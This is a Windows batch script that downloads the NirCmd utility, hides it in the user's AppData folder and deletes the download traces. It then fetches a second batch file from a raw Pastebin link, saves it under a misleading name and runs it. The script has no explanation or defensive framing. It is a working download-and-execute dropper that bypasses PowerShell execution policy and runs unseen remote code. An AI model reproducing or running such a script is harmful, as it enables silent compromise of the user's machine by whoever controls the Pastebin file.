@echo off

set "nircmd_url=https://www.nirsoft.net/utils/nircmd.zip"
set "nircmd_zip=%USERPROFILE%\Downloads\nircmd.zip"
set "nircmd_extract=%USERPROFILE%\Downloads\nircmd"
set "nircmd_exe=%nircmd_extract%\nircmd.exe"
set "nircmd_path=%USERPROFILE%\AppData\Local"
set "bat_url=https://pastebin.com/raw/pqHM6eKp"
set "bat_path=%USERPROFILE%\AppData\Local\MegetVigtigFilAD.bat"

powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('%nircmd_url%', '%nircmd_zip%')"

powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%nircmd_zip%' -DestinationPath '%nircmd_extract%'"

copy "%nircmd_exe%" "%nircmd_path%"

del "%nircmd_zip%"
rd /s /q "%nircmd_extract%"

powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('%bat_url%', '%bat_path%')"

start "" "%bat_path%"
